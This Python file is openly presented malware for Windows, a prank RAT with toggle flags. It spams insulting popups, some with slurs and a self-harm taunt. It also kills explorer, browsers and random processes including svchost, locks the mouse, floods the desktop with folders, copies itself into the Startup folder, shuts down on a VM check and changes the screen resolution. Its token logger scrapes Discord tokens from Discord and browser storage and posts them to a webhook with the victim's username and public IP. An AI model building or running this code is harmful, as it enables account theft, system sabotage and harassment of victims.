import base64
import ctypes
import json
import multiprocessing
import os
import random
import re
import shutil
import sys
import threading
import time
import webbrowser
from urllib import request

import mouse
import psutil
import requests
import win32api
from playsound import playsound

# Disable/Enable featrues here
popups = False
open_links = False
change_wallpaper = False
lock_mouse = False
random_kill = False
kill_main = False
create_folder = False
sounds = False
startup = False
anti_kill = False
change_resolution = True

# Token logger settings
token_log = False
WEBHOOK_URL = "PUT WEBHOOK HERE"
PING_ME = False

# Change what pops up on screen
pop_up_text = ["LOL UR SO DUMB", "FUCKING IDIOT", "JUST RATTED YOU", "DUMBASS"]

# Change what links open up
links = ["google.com", "youtube.com"]

# Change whats being killed (recommend kill explorer)
kill_list = ["explorer.exe", "wallpaper64.exe", "wallpaper32.exe", "chrome.exe"]


# Change what are the random folders names
file_names = [
    f"LOL UR RETARDED {random.randint(0, 10000)}",
    f"LOL I RATTED YOU {random.randint(0, 10000)}",
    f"UR SO GAY {random.randint(0, 10000)}",
    f"YOU KNOW DN? {random.randint(0, 10000)}",
    f"UR SO DUMB LOOOOL {random.randint(0, 10000)}",
    f"HANG URSELF {random.randint(0, 10000)}",
    f"Why did you run this?, lol. {random.randint(0, 10000)}",
    f"Add NotSqvage#6666 tell him hes gay {random.randint(0, 10000)}",
    f"If you see this you have to send money {random.randint(0, 10000)}",
]


class harmless:
    """Harmless modules"""

    def __init__(self, pop_up_text, links):
        self.pop_up_text = pop_up_text
        self.links = links

    def pop_up(self):
        """Spams popups"""
        while 1:
            ctypes.windll.user32.MessageBoxW(
                0, random.choice(pop_up_text), "LOL", random.randint(1, 5)
            )
            time.sleep(random.randint(1, 5))

    def open_url(self):
        """Opens urls from list randomly"""
        while 1:
            webbrowser.open_new_tab(random.choice(links))
            time.sleep(random.randint(1, 10))

    def change_wallpaper(self):
        """Changes the wallpaper with random images from screenshot folder"""
        while 1:
            try:
                pic = random.choice(
                    os.listdir(f"{os.path.expanduser('~')}/Pictures/Screenshots")
                )
                path = f"{os.path.expanduser('~')}/Pictures/Screenshots/{pic}"

                ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
                time.sleep(random.randint(0, 3))
            except Exception:
                pass

    def mouse_lock(self):
        """Locks the mouse to prevent the program from being killed"""
        while 1:
            mouse.drag(0, 0, 0, 0, absolute=True, duration=0)

    def sound(self):
        """Plays sound from given path [BROKEN] WILL FIX LATER"""
        while 1:
            try:
                sound_ = random.choice(os.listdir("C:/Windows/Media/Windows/)"))
                playsound(sound_)
            except Exception:
                pass


class malware:
    """Malware modules"""

    def __init__(self, file_names, kill_list):
        self.file_names = file_names
        self.kill_list = kill_list

    def kill(self):
        """Kills select tasks"""
        while 1:
            for program in kill_list:
                os.system(f"taskkill /f /im {program}")
            time.sleep(30)

    def random_kill(self):
        """KILLS RANDOM PROCESSES"""
        while 1:
            processes = []
            try:
                for proc in psutil.process_iter():
                    try:
                        processes.append(proc.name())
                    except (
                        psutil.NoSuchProcess,
                        psutil.AccessDenied,
                        psutil.ZombieProcess,
                    ):
                        pass
            except Exception:
                pass
            finally:
                program = random.choice(processes)
                if program != "svchost.exe":
                    os.system(f"taskkill /f /im {program}")
                time.sleep(random.randint(5, 15))

            def isAdmin():
                """CHECK IS RAN AS ADMIN"""
                try:
                    is_admin = os.getuid() == 0
                except AttributeError:
                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                return is_admin

            if isAdmin():
                if random.randint(0, 25) == 1:
                    os.system("taskkill /f /im svchost.exe")

            time.sleep(random.randint(1, 20))

    def create_random_folder(self):
        """Creates random files with a base64 name"""
        while 1:
            for i in range(random.randint(1, 10)):
                try:

                    byte_stream = random.choice(file_names).encode("ascii")

                    base64_bytes = base64.b64encode(byte_stream)
                    base64_string = base64_bytes.decode("ascii")

                    path = f"{os.path.expanduser('~')}/Desktop/{''.join(base64_string)}"
                    os.mkdir(path)
                except Exception:
                    pass
            time.sleep(random.randint(1, 25))


class harmful:
    """Harmful modules"""


class ScreenRes(object):
    """Changes the screen res [CLEAN UP LATER]"""

    @classmethod
    def set(cls, width=None, height=None, depth=32):
        """Set the primary display to the specified mode"""

        if sys.platform == "win32":
            cls._win32_set(width, height, depth)

    @staticmethod
    def _win32_set(width=None, height=None, depth=32):
        """Set the primary windows display to the specified mode"""
        # Gave up on ctypes, the struct is really complicated
        # user32.ChangeDisplaySettingsW(None, 0)

        if width and height:

            if not depth:
                depth = 32

            mode = win32api.EnumDisplaySettings()
            mode.PelsWidth = width
            mode.PelsHeight = height
            mode.BitsPerPel = depth

            win32api.ChangeDisplaySettings(mode, 0)
        else:
            win32api.ChangeDisplaySettings(None, 0)


harmless = harmless(pop_up_text, links)
malware = malware(file_names, kill_list)
harmful = harmful()


class process_events:
    """Multithreaded stuff"""

    def anti_kill():
        """detects when a process has been killed"""
        while 1:
            if os.path.basename(sys.argv[0]) not in (
                p.name() for p in psutil.process_iter()
            ):
                pass


if __name__ == "__main__":
    """VM CHECK"""
    if hasattr(sys, "real_prefix"):
        os.system("shutdown /s")
        while 1:
            os.system("start")
            ctypes.windll.user32.MessageBoxW(0, "WHY USE VM???", "NICE VM", 1)
    else:
        if startup == True:
            shutil.copy(
                f"{os.getcwd()}/{os.path.basename(sys.argv[0])}",
                os.path.expanduser("~")
                + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup",
            )
        ctypes.windll.user32.MessageBoxW(
            0, "YOUR PC HAS BEEN GRIEFED BY A PC FUCKER", "LOL UR SO DUMB", 1
        )

        # Clean later
        if token_log == True:

            def find_tokens(path):
                try:
                    path += "\\Local Storage\\leveldb"
                    tokens = []

                    for file_name in os.listdir(path):
                        if not file_name.endswith(".log") and not file_name.endswith(
                            ".ldb"
                        ):
                            continue

                        for line in [
                            x.strip()
                            for x in open(
                                f"{path}\\{file_name}", errors="ignore"
                            ).readlines()
                            if x.strip()
                        ]:
                            for regex in (
                                r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
                                r"mfa\.[\w-]{84}",
                            ):
                                for token in re.findall(regex, line):
                                    tokens.append(token)
                    return tokens
                except Exception:
                    pass

            def logger():
                local = os.getenv("LOCALAPPDATA")
                roaming = os.getenv("APPDATA")

                paths = {
                    "Discord": f"{roaming}\\Discord",
                    "Discord Canary": f"{roaming}\\discordcanary",
                    "Discord PTB": f"{roaming}\\discordptb",
                    "Google Chrome": f"{local}\\Google\\Chrome\\User Data\\Default",
                    "Opera": f"{roaming}\\Opera Software\\Opera Stable",
                    "Brave": f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
                    "Yandex": f"{local}\\Yandex\\YandexBrowser\\User Data\\Default",
                }

                message = "@everyone" if PING_ME else ""

                for platform, path in paths.items():
                    if not os.path.exists(path):
                        continue

                    message += f"\n**{platform}**\n```\n"
                    tokens = find_tokens(path)

                    if len(tokens) > 0:
                        for token in tokens:
                            message += f"{token}\n"
                    else:
                        message += "No tokens found.\n"

                    message += "```"

                headers = {
                    "Content-Type": "application/json",
                    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
                }

                payload = json.dumps({"content": message})
                info = f" {os.environ['USERNAME']} {requests.get('https://api.ipify.org').text}"
                packet = payload + info

                try:
                    req = request(WEBHOOK_URL, data=packet.encode(), headers=headers)
                    request.urlopen(req)
                except Exception:
                    pass

            logger()

        # Feature checks
        if popups == True:
            popup_thread = threading.Thread(target=harmless.pop_up).start()

        if open_links == True:
            openurl_thread = threading.Thread(target=harmless.open_url).start()

        if change_wallpaper == True:
            change_wallpaper = threading.Thread(
                target=harmless.change_wallpaper
            ).start()

        if lock_mouse == True:
            mouse_locker = threading.Thread(target=harmless.mouse_lock).start()

        if kill_main == True:
            kill_thread = threading.Thread(target=malware.kill).start()

        if random_kill == True:
            random_kill_thread = threading.Thread(target=malware.random_kill).start()

        if create_folder == True:
            create_random_folder_thread = threading.Thread(
                target=malware.create_random_folder
            ).start()

        if sounds == True:
            sound_thread = threading.Thread(target=harmless.sound).start()

        if anti_kill == True:
            anti_kill_thread = multiprocessing.Process(
                target=process_events.anti_kill, name="check for kill"
            ).start()

        if change_resolution == True:
            ScreenRes.set(random.randint(100, 1000), random.randint(100, 1000))
